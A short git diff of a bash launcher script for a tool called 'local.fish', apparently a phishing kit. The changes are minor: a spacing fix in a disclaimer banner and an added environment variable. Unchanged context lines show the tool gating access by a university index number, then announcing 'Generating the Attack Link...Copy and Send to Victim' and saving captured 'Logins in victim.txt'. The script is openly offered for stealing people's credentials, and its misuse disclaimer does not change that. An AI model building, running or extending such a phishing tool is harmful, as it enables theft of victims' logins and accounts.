@@ -6,7 +6,7 @@ REPO_NAME="local.fish"
 GITHUB_URL="https://github.com/$GITHUB_USER/$REPO_NAME"
 
 # 🔹 1st Checker: Verify if the GitHub Repository Exists
-echo -e "\e[33m⚠️Caution: By Continuing, you Admit to be a Member of the ~ University of Education,Winneba; and Agree to be Held Responsible for any Misuse of this Tool.\e[0m"
+echo -e "\e[33m⚠️ Caution: By Continuing, you Admit to be a Member of the ~ University of Education,Winneba; and Agree to be Held Responsible for any Misuse of this Tool.\e[0m"
 
 echo -e "\\n\\n"
 
@@ -69,6 +69,9 @@ else
     echo -e "\e[31m❌ Invalid index number format! Access Denied.\e[0m"
     exit 1
 fi
+
+export FROM_START=true
+
 
 # 🔹 Final Step: Start the Server
 echo -e "\e[32m🚀 Generating the Attack Link...Copy and Send to Victim\nLogins in victim.txt file\e[0m"
